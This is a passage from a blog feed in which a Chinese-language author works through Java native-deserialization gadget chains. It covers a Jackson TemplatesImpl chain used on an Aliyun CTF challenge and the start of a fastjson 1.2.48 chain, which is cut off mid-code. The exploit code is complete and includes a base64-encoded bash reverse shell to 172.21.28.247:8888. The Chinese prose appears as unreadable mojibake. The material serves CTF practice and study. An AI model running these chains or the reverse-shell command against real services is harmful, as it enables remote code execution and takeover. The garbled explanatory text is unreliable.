class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410131232076.png" alt="image-20241013123218942"></p><p>è¿™æ˜¯ä¼šå‘ç°æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™å‡ºé”™äº†</p><p>æ ¹æ®é”™è¯¯å…ˆå»çœ‹ObjectOuptputStream#writeObject0æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410131234990.png" alt="image-20241013123431941"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šåˆ¤æ–­åºåˆ—åŒ–ç±»æ˜¯å¦å®ç°äº†writeReplaceæ–¹æ³•ï¼Œå®ç°äº†åˆ™ä¼šè¿›è¡Œè°ƒç”¨ï¼Œè€Œåœ¨BaseJsonNodeä¸­å®ç°äº†è¯¥æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•è°ƒç”¨çš„æ—¶å€™æŠ›å‡ºäº†å¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/202410131237369.png" alt="image-20241013123712324"></p><p>æ–‡ç« ä¸­ç›´æ¥å°†è¯¥æ–¹æ³•æ³¨é‡Šæˆ–åˆ å»å°±æ­£å¸¸äº†ï¼Œæˆ‘å‹’ä¸ªç®€å•ç²—æš´å•ŠğŸ˜¢</p><p>è¿™é‡Œéœ€è¦é‡å†™ä¸€ä¸‹jaråŒ…ï¼Œä¹‹å‰æ²¡å†™è¿‡é¡ºä¾¿è®°å½•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.æ‰¾åˆ°ä½ æ‰€è¦é‡å†™çš„æ–¹æ³•çš„æ‰€åœ¨ç±»ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„è·¯å¾„ï¼›<br><br>2.åœ¨æˆ‘ä»¬çš„srcç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåŒåŒ…ååŒç±»åçš„ç±»ï¼›<br><br>3.å°†jaråŒ…ä¸­çš„é‡å†™æ–¹æ³•æ‰€åœ¨ç±»çš„æ‰€æœ‰ä»£ç å¤åˆ¶åˆ°æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ï¼›<br><br>4.åœ¨æˆ‘ä»¬æ–°å»ºçš„åŒåŒ…ååŒç±»åçš„ç±»ä¸­ä¿®æ”¹å¯¹åº”çš„æ–¹æ³•ä¸­çš„ä»£ç <br><br>åŸç†ï¼š<br>ç¼–è¯‘è¾“å‡ºçš„æ—¶å€™ä¼šä¼˜å…ˆä½¿ç”¨æˆ‘ä»¬srcä¸‹é¢çš„ç±»ï¼Œè€Œä¸æ˜¯ä¼˜å…ˆä½¿ç”¨JaråŒ…é‡Œé¢çš„ç±»ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†è¦†ç›–jaråŒ…æ–¹æ³•çš„ç›®çš„<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_41512902/article/details/125558275">https://blog.csdn.net/qq_41512902/article/details/125558275</a></p><p>æœ€åæ”¹æˆè¿™æ ·å°±è¡Œäº†</p><p><img src="https://cdn.clown2024.cn/202410131251160.png" alt="image-20241013125145111"></p><p>å†å»æ‰“ä¸€éexpè¯•è¯•</p><p><img src="https://cdn.clown2024.cn/202410131252817.png" alt="image-20241013125207733"></p><p>ç°åœ¨å°±èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨äº†</p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>è¿™é‡Œå°±é‚£é˜¿é‡Œäº‘ctfçš„ä¸€é“é¢˜æ¥ä½œä¸ºä¾‹å­</p><p>é¢˜ç›®é™„ä»¶ï¼š<a href="https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1">https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1</a></p><p>åç¼–è¯‘ä¸‹jaråŒ…</p><p><img src="https://cdn.clown2024.cn/202410131311887.png" alt="image-20241013131145827"></p><p>å°±å‡ è¡Œä»£ç ï¼Œç›´æ¥è¯»å–æ•°æ®ååºåˆ—åŒ–</p><p>çœ‹äº†ä¸€ä¸‹ä¾èµ–å°±åªæœ‰springbootï¼Œé‚£è‚¯å®šæ˜¯æ‰“jacksonäº†ï¼Œspringbootä¾èµ–é»˜è®¤ç”¨jacksonï¼Œè€Œä¸”éƒ½æ”¾åˆ°è¿™å½“ä¾‹é¢˜äº†</p><p>é‚£å°±å¯ä»¥ç”¨å‰é¢çš„expæ‰“ä¸€ä¸ªJacksonåŸç”Ÿååºåˆ—åŒ–ï¼Œè¿™é‡Œè¿˜è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜å°±æ˜¯payloadçš„å‘é€ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰base64è§£ç ç›´æ¥copyè¿‡å»ä¼šå‡ºé”™ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç”¨javaå‘è¯·æ±‚è¿‡å»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMjguMjQ3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        System.out.println(byteArray);<br><br>        <span class="hljs-comment">//å‘é€Postè¯·æ±‚</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/bypassit&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        conn.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        conn.setDoOutput(<span class="hljs-literal">true</span>);<br>        conn.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        conn.getOutputStream().write(byteArray);<br>        conn.getOutputStream().flush();<br><br>        <span class="hljs-comment">// è¯»å–å“åº”</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è®°å¾—è¦åˆ é™¤writeReplaceæ–¹æ³•</p></blockquote><p>åå¼¹shellè¿‡æ¥å³å¯</p><p><img src="https://cdn.clown2024.cn/202410140030909.png" alt="image-20241014003050846"></p><p>æˆ–è€…ç›´æ¥åºåˆ—åŒ–å­˜å…¥æ–‡ä»¶ï¼Œç„¶åç”¨pythonå‘è¯·æ±‚</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>res=requests.post(url,data=data)<br></code></pre></td></tr></table></figure><h1 id="å…¶ä»–é“¾å­"><a href="#å…¶ä»–é“¾å­" class="headerlink" title="å…¶ä»–é“¾å­"></a>å…¶ä»–é“¾å­</h1><p>æ¯”å¦‚Templatesè¢«bançš„æƒ…å†µä¸‹ç”¨SignObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQI23Ezabx&u_atoken=8440f6b703af0eb6335929f9798f602f&u_asig=ac11000117287520205018812e007f#toc-34">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQI23Ezabx&amp;u_atoken=8440f6b703af0eb6335929f9798f602f&amp;u_asig=ac11000117287520205018812e007f#toc-34</a></p><p>è¿˜æœ‰å…¶ä½™çš„å°±åœ¨åšé¢˜æ—¶é‡åˆ°å†å­¦å§</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7&quot;&gt;https://xz.a</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>fastjsonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-11T04:15:15.000Z</published>
    <updated>2024-10-11T09:21:33.257Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹äº†fastjsonçš„å„ç‰ˆæœ¬é“¾å­ï¼Œå†çœ‹ä¸€ä¸‹fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼Œçœ‹çš„æ˜¯y4å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>æ¥ç®€å•çš„å­¦ä¹ å¤ç°ä¸€ä¸‹</p><h1 id="åˆ©ç”¨é™åˆ¶"><a href="#åˆ©ç”¨é™åˆ¶" class="headerlink" title="åˆ©ç”¨é™åˆ¶"></a>åˆ©ç”¨é™åˆ¶</h1><p>Fastjson1ç‰ˆæœ¬å°äºç­‰äº1.2.48(ä¸è¿‡1.2.49ä¹‹åä¹Ÿæœ‰ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ç›´æ¥ç”¨ä¸éœ€è¦ç»•è¿‡çš„)</p><p>Fastjson2&lt;&#x3D;2.0.26(æˆ‘è‡ªå·±æµ‹è¯•åˆšå¥½åœ¨æ–‡ç« ç‰ˆæœ¬çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬2.0.27å¼€å§‹å°±ä¸è¡Œäº†)</p><h1 id="æ‰¾é“¾å­"><a href="#æ‰¾é“¾å­" class="headerlink" title="æ‰¾é“¾å­"></a>æ‰¾é“¾å­</h1><p>è¦ç”¨åŸç”Ÿååºåˆ—åŒ–ï¼Œå°±éœ€è¦å¯»æ‰¾fastjsonä¸­ç»§æ‰¿äº†Serializableæ¥å£çš„ç±»ï¼Œfastjsoné‡Œé¢æœ‰ä¸¤ä¸ªè¿™æ ·çš„ç±»ï¼šJSONArrayä¸JSONObject</p><p>è¿™ä¸¤ä¸ªç±»çš„åˆ©ç”¨æ–¹å¼å·®ä¸å¤šï¼Œè¿™é‡Œç”¨JSONArrayè¿™ä¸ªç±»</p><p>è¿™ä¸¤ä¸ªæœ¬èº«æ˜¯æ²¡æœ‰å®ç°readObjectæ–¹æ³•çš„ï¼Œæ‰€ä»¥æ˜¯é€šè¿‡å…¶ä»–ç±»çš„readObjectæ¥è§¦å‘JSONArrayä¸JSONObjectä¸­çš„æŸä¸ªæ–¹æ³•æ¥å½¢æˆé“¾å­ã€‚</p><p>æ–‡ç« ä¸­çš„å°±æ˜¯åˆ©ç”¨JSONçš„toStringæ–¹æ³•è§¦å‘JSONçš„toJsonStringçš„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>è¿™å’ŒJSONObjectä»¥åŠJSONArrayæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘å»çœ‹äº†æºç ï¼ŒJSONArrayå’ŒJSONObjectæ˜¯JSONçš„å­ç±»ï¼Œä»–ä»¬æœ¬èº«æ˜¯æ²¡æœ‰toStringæ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°å…¶çˆ¶ç±»JSONçš„toStringæ–¹æ³•</p><p>é‚£ä¸ºä»€ä¹ˆè¦è§¦å‘toStringå‘¢ï¼Œå› ä¸ºJSONObjectå’ŒJSONArrayåœ¨è§¦å‘toStringæ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œæ¬¸é‚£å°±å¯ä»¥ç”¨æ¥å°†æˆ‘ä»¬çš„é“¾å­å°è£…åœ¨é‡Œé¢æ¥è§¦å‘äº†</p><p>getè§¦å‘ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObjectè°ƒç”¨toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArrayè°ƒç”¨toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>è‡³äºä¸ºä»€ä¹ˆtoStringä¼šè°ƒç”¨getteræ–¹æ³•å°±çœ‹æ–‡ç« çš„åˆ†æäº†è§£ä¸€ä¸‹å°±å¥½äº†</p><h1 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h1><p>èƒ½è§¦å‘getteræ–¹æ³•å°±å¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡è§¦å‘TemplatesImplçš„getOutputPropertiesæ–¹æ³•å®ç°åŠ è½½ä»»æ„å­—èŠ‚ç æœ€ç»ˆè§¦å‘æ¶æ„æ–¹æ³•è°ƒç”¨</p><p>ç„¶åè§¦å‘toStringæ–¹æ³•æˆ‘ä»¬å¯ä»¥åˆ©ç”¨BadAttributeValueExpExceptionæ¥è§¦å‘ï¼Œè¯¥ç±»åœ¨ccå’Œromeé“¾éƒ½æœ‰ç”¨åˆ°</p><p>é‚£ä¹ˆé“¾å­æˆ‘ä»¬å°±å¯ä»¥å†™å‡ºæ¥äº†ï¼Œè¿™é‡Œç”¨javassiståŠ¨æ€ç”Ÿæˆæ¶æ„ç±»</p><p><strong>åˆ©ç”¨ä¾èµ–</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨é“¾</strong></p><p>fastjson1çš„åˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span 